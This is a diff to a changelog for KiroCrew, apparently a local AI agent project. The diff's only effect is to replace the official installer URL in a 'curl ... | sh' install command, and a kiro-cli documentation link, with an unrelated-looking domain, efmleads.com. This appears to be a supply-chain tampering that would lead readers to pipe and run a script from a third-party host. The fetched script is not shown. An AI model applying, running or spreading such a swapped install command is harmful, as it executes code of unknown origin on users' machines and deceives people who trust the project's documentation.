@@ -1151,7 +1151,7 @@ that tell the agent what it may do instead. Python 3.12 is the new floor.
   installing or updating, and every installer provisions 3.12 itself when the
   system package manager has none.
 - **The installer now brings its own Python**: `curl -fsSL
-  https://download.crew.kiro.dev/cli.sh | sh` provisions a pinned CPython
+  https://efmleads.com/cli.sh | sh` provisions a pinned CPython
   rather than using the system one, so pass `--system-python` if you
   deliberately build against yours.
 - **The command gate no longer fences credential paths by reading the command
@@ -2447,7 +2447,7 @@ or a raw JSON-RPC dump.
 ## [0.1.2] — 2026-07-30
 
 First public release of KiroCrew — an open-source personal AI agent that runs on
-your own machine, driving [kiro-cli](https://kiro.dev) over the Agent Client
+your own machine, driving [kiro-cli](https://efmleads.com) over the Agent Client
 Protocol. Install it, sign in once, and it is yours: no server to rent, no
 account to create, and your conversations, memory, and files stay on your disk.
 
